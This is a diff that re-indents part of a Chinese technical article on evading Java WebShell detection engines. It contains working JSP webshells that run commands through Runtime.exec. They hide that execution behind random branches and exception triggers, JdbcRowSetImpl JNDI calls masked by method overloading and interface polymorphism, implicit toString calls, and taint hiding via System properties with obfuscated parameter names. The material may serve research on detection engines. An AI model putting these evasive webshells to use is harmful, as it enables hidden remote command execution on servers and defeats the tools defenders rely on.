@@ -299,39 +299,39 @@ SunCommandLineLauncher类的launch方法中就存在runtime.getRuntime().exec()�
 
 * 使用随机数
 
-    ```java
-    <%    
-        Random r = new Random();
-        int d1 = r.nextInt(2); 
-        int d2 = r.nextInt(2);
-        if (d1 == d2){
-            exec();
-        }else{
-            
-        }
-    %>
-    ```
+```java
+<%    
+    Random r = new Random();
+    int d1 = r.nextInt(2); 
+    int d2 = r.nextInt(2);
+    if (d1 == d2){
+        exec();
+    }else{
+        
+    }
+%>
+```
 
-    如果引擎会在沙箱运行程序，则由于Random的随机性，可能会进入else分支，从而检测不到恶意代码被运行，模拟运行也可能会因为无法判断两个nextInt()对象会相同从而检测不到。而我们把random的范围设置的小一点，则在实际运行时，可以保证有一个较高的概率，在我们运行代码时程序被运行。事实上这里的nextInt参数也可以动态传入，进一步区分引擎运行和我们人工运行的概率区别。
+如果引擎会在沙箱运行程序，则由于Random的随机性，可能会进入else分支，从而检测不到恶意代码被运行，模拟运行也可能会因为无法判断两个nextInt()对象会相同从而检测不到。而我们把random的范围设置的小一点，则在实际运行时，可以保证有一个较高的概率，在我们运行代码时程序被运行。事实上这里的nextInt参数也可以动态传入，进一步区分引擎运行和我们人工运行的概率区别。
 
 * 利用异常捕获
 
-    利用动态沙箱引擎无法准确判断并模拟用户的输入内容，进行绕过。
-    ```java
-    <%
-        try{
-            if (request.getParameter("1")!=null){
-                int a = 1/Integer.parseInt(request.getParameter("1"));
-            }
-        }catch ( NumberFormatException e){
-        
-        }catch (Exception e){
-            exec();
+利用动态沙箱引擎无法准确判断并模拟用户的输入内容，进行绕过。
+```java
+<%
+    try{
+        if (request.getParameter("1")!=null){
+            int a = 1/Integer.parseInt(request.getParameter("1"));
         }
-    %>
-    ```
+    }catch ( NumberFormatException e){
+    
+    }catch (Exception e){
+        exec();
+    }
+%>
+```
 
-    正常来说程序不会进入catch块，当请求的参数中包含?1=0时，程序会触发零除异常，进入catch块执行恶意操作。
+正常来说程序不会进入catch块，当请求的参数中包含?1=0时，程序会触发零除异常，进入catch块执行恶意操作。
 
 ### （三）模拟污点执行绕过
 
@@ -341,179 +341,179 @@ SunCommandLineLauncher类的launch方法中就存在runtime.getRuntime().exec()�
 
 - 利用方法“重载”
 
-    首先提出一个问题。在java中，一个类如果长这样：
+首先提出一个问题。在java中，一个类如果长这样：
 
-    ```java
-    Class B {
-        public Object print(Object str){
-            System.out.println("B"+str);
-        }
+```java
+Class B {
+    public Object print(Object str){
+        System.out.println("B"+str);
     }
+}
 
-    new B().print("test");
-    ```
+new B().print("test");
+```
 
-    那么这里显然是会调用B类的print方法。但如果B类是如下写法呢？
+那么这里显然是会调用B类的print方法。但如果B类是如下写法呢？
 
-    ```java
-    Class A {
-        public Object print(String str){
-            System.out.println("A"+str);
-        }
+```java
+Class A {
+    public Object print(String str){
+        System.out.println("A"+str);
     }
+}
 
-    Class B extend A {
-        public Object print(Object str){
-            System.out.println("B"+str);
-        }
+Class B extend A {
+    public Object print(Object str){
+        System.out.println("B"+str);
     }
-    new B().print("test");
-    ```
+}
+new B().print("test");
+```
 
-    或者如下写法：
+或者如下写法：
 
-    ```java
-    Class A {
-        public Object print(Object str){
-            System.out.println("A"+str);
-        }
+```java
+Class A {
+    public Object print(Object str){
+        System.out.println("A"+str);
     }
+}
 
-    Class B extend A {
-        public Object print(String str){
-            System.out.println("B"+str);
-        }
+Class B extend A {
+    public Object print(String str){
+        System.out.println("B"+str);
     }
-    new B().print("test");
-    ```
+}
+new B().print("test");
+```
 
-    这是一个乍看起来重载了，但是又没完全重载的例子。事实上，程序最后会调用的均是入参为`String`的print方法，在第一个例子中，会调用A.print()，在第二个例子中会调用B.print()。
+这是一个乍看起来重载了，但是又没完全重载的例子。事实上，程序最后会调用的均是入参为`String`的print方法，在第一个例子中，会调用A.print()，在第二个例子中会调用B.print()。
 
-    重载对方法的要求是入参类型**完全相同**。在上述两个例子中，子类和父类的参数都不同，也就代表A.print和B.print是两个不同的方法。而java的方法调用过程中，并不是遵循“先在子类的方法中寻找符合条件的方法，找不到再去父类中寻找这种方法”，而是直接在目标类及其所有父类方法中去找和调用方法最匹配的那个方法，进行加载和调度。然而对于WebShell检测引擎来说，可能为了性能考虑，或者是对Java的方法调用过程不够了解，会在模拟运行时，遵循上面说的那种寻找方法的方法，先在子类方法中寻找，找不到再去父类方法中寻找。导致了引擎获取到的执行方法和Java程序实际的执行方法出现不同，从而触发了绕过。举一个WebShell的例子：
+重载对方法的要求是入参类型**完全相同**。在上述两个例子中，子类和父类的参数都不同，也就代表A.print和B.print是两个不同的方法。而java的方法调用过程中，并不是遵循“先在子类的方法中寻找符合条件的方法，找不到再去父类中寻找这种方法”，而是直接在目标类及其所有父类方法中去找和调用方法最匹配的那个方法，进行加载和调度。然而对于WebShell检测引擎来说，可能为了性能考虑，或者是对Java的方法调用过程不够了解，会在模拟运行时，遵循上面说的那种寻找方法的方法，先在子类方法中寻找，找不到再去父类方法中寻找。导致了引擎获取到的执行方法和Java程序实际的执行方法出现不同，从而触发了绕过。举一个WebShell的例子：
 
-    ```java
-    <%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
-    <%@ page import="java.sql.SQLException" %>
-    <%@ page contentType="text/html; charset=UTF-8" language="java" %>
-    <%
-        class a extends JdbcRowSetImpl{
-            public a() {
-                super();
-            }
-            public void setDataSourceName(Object var1) throws SQLException{
-            };
-            public void setAutoCommit(Object var1) throws SQLException{
-            };
+```java
+<%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
+<%@ page import="java.sql.SQLException" %>
+<%@ page contentType="text/html; charset=UTF-8" language="java" %>
+<%
+    class a extends JdbcRowSetImpl{
+        public a() {
+            super();
         }
-        a A =  new a();
-        A.setDataSourceName(request.getParameter("url"));
-        A.setAutoCommit(true);
-    %>
-    ```
+        public void setDataSourceName(Object var1) throws SQLException{
+        };
+        public void setAutoCommit(Object var1) throws SQLException{
+        };
+    }
+    a A =  new a();
+    A.setDataSourceName(request.getParameter("url"));
+    A.setAutoCommit(true);
+%>
+```
 
-    对于检测引擎来说，样本运行的是两个空的setDataSourceName和setAutoCommit方法。但实际上程序执行的还是JdbcRowSetImpl的方法，导致了绕过。
+对于检测引擎来说，样本运行的是两个空的setDataSourceName和setAutoCommit方法。但实际上程序执行的还是JdbcRowSetImpl的方法，导致了绕过。
 
 - 利用Java类的多态误导引擎识别对象类型
-    
-    如果存在如下接口：
 
-    ```java
+如果存在如下接口：
+
+```java
+interface A {
+    void setDataSourceName(String var1) throws SQLException;
+    void setAutoCommit(boolean autoCommit) throws SQLException;
+}
+```
+
+如果我们创建一个类：
+
+```java
+class B implements A{
+}
+```
+
+这样毫无疑问会编译不通过，因为我们没有在B中对A接口的两个方法定义进行实现
+
+![](/img/aiWebshell/21227952-31d0-4c11-98f7-bc88163e7475.png)
+
+但是如果此时我们把Class B修改成如下写法：
+
+```java
+class B extends JdbcRowSetImpl implements A{
+    }
+```
+
+会发现编译可以通过。原因是java在编译的过程中是**先处理继承**，再**处理接口**。因此当我们的B类继承了JdbcRowSetImpl 类，再去实现A接口时，Java会从B及其父类方法中寻找实现方法。同时由于 Java类的多态，我们对实现类为 B 的 A 接口对象，调用其定义的 set\*方法时，它会调用 B 继承的 JdbcRowSetImpl 类中的对应方法。但是对于检测引擎来说，此时执行的是接口A的setDataSourceName和setAutoCommit方法。引擎很难获取到接口A会和JdbcRowSetImpl 类有什么关系。它顶多在接口A的实现类中寻找是否存在危险方法或调用，无论如何也找不到JdbcRowSetImpl的头上。因此也就无法判断该样本为WebShell。根据此方法进行WebShell构建：
+
+```java
+<%@ page import="java.sql.SQLException" %>
+<%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
+<%!
     interface A {
         void setDataSourceName(String var1) throws SQLException;
         void setAutoCommit(boolean autoCommit) throws SQLException;
     }
-    ```
-
-    如果我们创建一个类：
-
-    ```java
-    class B implements A{
-    }
-    ```
-
-    这样毫无疑问会编译不通过，因为我们没有在B中对A接口的两个方法定义进行实现
-
-    ![](/img/aiWebshell/21227952-31d0-4c11-98f7-bc88163e7475.png)
-
-    但是如果此时我们把Class B修改成如下写法：
-
-    ```java
+%>
+<%
     class B extends JdbcRowSetImpl implements A{
-        }
-    ```
-
-    会发现编译可以通过。原因是java在编译的过程中是**先处理继承**，再**处理接口**。因此当我们的B类继承了JdbcRowSetImpl 类，再去实现A接口时，Java会从B及其父类方法中寻找实现方法。同时由于 Java类的多态，我们对实现类为 B 的 A 接口对象，调用其定义的 set\*方法时，它会调用 B 继承的 JdbcRowSetImpl 类中的对应方法。但是对于检测引擎来说，此时执行的是接口A的setDataSourceName和setAutoCommit方法。引擎很难获取到接口A会和JdbcRowSetImpl 类有什么关系。它顶多在接口A的实现类中寻找是否存在危险方法或调用，无论如何也找不到JdbcRowSetImpl的头上。因此也就无法判断该样本为WebShell。根据此方法进行WebShell构建：
-
-    ```java
-    <%@ page import="java.sql.SQLException" %>
-    <%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
-    <%!
-        interface A {
-            void setDataSourceName(String var1) throws SQLException;
-            void setAutoCommit(boolean autoCommit) throws SQLException;
-        }
-    %>
-    <%
-        class B extends JdbcRowSetImpl implements A{
-        }
-        A a = (A)new B();
-        a.setDataSourceName(request.getParameter("url"));
-        a.setAutoCommit(true);
-    %>
-    ```
+    }
+    A a = (A)new B();
+    a.setDataSourceName(request.getParameter("url"));
+    a.setAutoCommit(true);
+%>
+```
 
 - 隐式方法调用
 
-    java中存在一些语法糖，如果引擎未能对这类模式进行识别，则也可以产生绕过。
+java中存在一些语法糖，如果引擎未能对这类模式进行识别，则也可以产生绕过。
 
-    ```java
-    <%
-    class a{
-        public String toString(){
-            exec();
-        }
+```java
+<%
+class a{
+    public String toString(){
+        exec();
     }
-    throw new NullPointerException(new a()+"");
-    %>
-    ```
+}
+throw new NullPointerException(new a()+"");
+%>
+```
 
-    对对象进行字符串拼接时，会隐式的调用其`toString`方法。类似还有`hashCode`之类的方法。
+对对象进行字符串拼接时，会隐式的调用其`toString`方法。类似还有`hashCode`之类的方法。
 
 - 隐藏污点传播
 
-    单是上面几类绕过，更多的是阻断引擎发现我们的意图是在执行危险的sink，在很多时候还是无法绕过真实的检测引擎。有一个重要原因是source点往往会或多或少的暴露我们的真实意图。拿上面这个样本来说：
+单是上面几类绕过，更多的是阻断引擎发现我们的意图是在执行危险的sink，在很多时候还是无法绕过真实的检测引擎。有一个重要原因是source点往往会或多或少的暴露我们的真实意图。拿上面这个样本来说：
 
-    ```java
-    a.setDataSourceName(request.getParameter("url"));
-    ```
+```java
+a.setDataSourceName(request.getParameter("url"));
+```
 
-    JdbcRowImpl的利用模式在Java安全太过出名，所以它还是具备很强的WebShell特征，另外引擎在模拟污点分析过程中对于source的跟踪和检测也比较容易发现一些我们想隐藏的意图。因此还有一个重要的绕过点，就是对于污点的隐藏，切断引擎对污点传播的分析。
+JdbcRowImpl的利用模式在Java安全太过出名，所以它还是具备很强的WebShell特征，另外引擎在模拟污点分析过程中对于source的跟踪和检测也比较容易发现一些我们想隐藏的意图。因此还有一个重要的绕过点，就是对于污点的隐藏，切断引擎对污点传播的分析。
 
-    一种很好用的方法是利用全局变量：
+一种很好用的方法是利用全局变量：
 
-    利用System类的`setProperty`和`getProperty`方法进行参数的传递。引擎很难判断exec的参数System.getProprety("test")是来自用户输入的污点。
+利用System类的`setProperty`和`getProperty`方法进行参数的传递。引擎很难判断exec的参数System.getProprety("test")是来自用户输入的污点。
 
-    ```java
-    <%
-        System.setProperty(request.getParameter("a"),request.getParameter("b"));
-        Runtime.getRuntime().exec(System.getProperty("test"));
-    %>
-    ```
+```java
+<%
+    System.setProperty(request.getParameter("a"),request.getParameter("b"));
+    Runtime.getRuntime().exec(System.getProperty("test"));
+%>
+```
 
-    ![](/img/aiWebshell/841bfb49-b093-4eb7-9559-e19053e59571.png)
+![](/img/aiWebshell/841bfb49-b093-4eb7-9559-e19053e59571.png)
 
-    一切出现字符串的地方都可以用request.getParameter代替。因此request.getParameter()的参数也可以递归放入request.getParameter()，并且最终也可以不使用硬编码的字符串，而是在系统中寻找一些字符串作为参数，加强混淆效果，例如：
+一切出现字符串的地方都可以用request.getParameter代替。因此request.getParameter()的参数也可以递归放入request.getParameter()，并且最终也可以不使用硬编码的字符串，而是在系统中寻找一些字符串作为参数，加强混淆效果，例如：
 
-    ```java
-    <%
-        System.setProperty(request.getParameter(request.getParameter(this.getClass().getName())),request.getParameter(request.getParameter(this.getClass().getPackage().getName())));
-        Runtime.getRuntime().exec(System.getProperty(this.toString().substring(0,this.toString().indexOf("@"))));
-    %>
-    ```
+```java
+<%
+    System.setProperty(request.getParameter(request.getParameter(this.getClass().getName())),request.getParameter(request.getParameter(this.getClass().getPackage().getName())));
+    Runtime.getRuntime().exec(System.getProperty(this.toString().substring(0,this.toString().indexOf("@"))));
+%>
+```
 
-    ![](/img/aiWebshell/4d73e0c3-57f4-4561-b64c-96331e870627.png)
+![](/img/aiWebshell/4d73e0c3-57f4-4561-b64c-96331e870627.png)
 
-    如果System.setProperty会被引擎识别或者拦截，则也可以像本文第一部分中找不常见的代码执行/系统执行的方法，找一些不常见的类会调System.setProperty的方法的类进行绕过。另外，从本质上说，任何可读写的全局变量、单例对象都可以用来进行参数的传递。
+如果System.setProperty会被引擎识别或者拦截，则也可以像本文第一部分中找不常见的代码执行/系统执行的方法，找一些不常见的类会调System.setProperty的方法的类进行绕过。另外，从本质上说，任何可读写的全局变量、单例对象都可以用来进行参数的传递。
 
 ## 四、新的挑战
 
